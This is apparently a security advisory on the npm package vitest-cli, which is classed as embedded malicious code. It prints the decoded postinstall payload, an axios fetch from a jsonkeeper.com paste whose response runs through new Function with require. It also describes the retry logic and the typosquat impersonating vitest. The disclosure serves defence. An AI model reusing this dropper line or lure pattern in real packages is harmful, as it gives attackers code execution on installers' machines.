summary: vitest-cli postinstall fetches and executes attacker-controlled JavaScript from jsonkeeper.com
details: On `npm install`, scripts/postinstall.js (delegating to lib/postinstall/index.js) evaluates a Dean-Edwards p,a,c,k,e,d JavaScript blob whose decoded body is `require('axios').get('https://jsonkeeper.com/external/W33XO').then(r => new Function('require', r.data.cookie)(require))`. The fetched response body is passed to `new Function` and invoked with the package's `require`, giving full remote code execution on the installer's machine before any user code runs. The fetch is retried 3 times with 10-minute sleeps to survive transient network issues. jsonkeeper.com is an anonymous, mutable JSON-paste host — the executed bytes are attacker-controlled and can change at any time without a new package release. The package additionally impersonates the official `vitest` project (declares `peerDependencies.vitest >=1.0.0`, name `vitest-cli`), while `author`, `repository.url`, `bugs.url`, and `homepage` in package.json are all empty strings — a typosquat lure shape combined with an active dropper payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
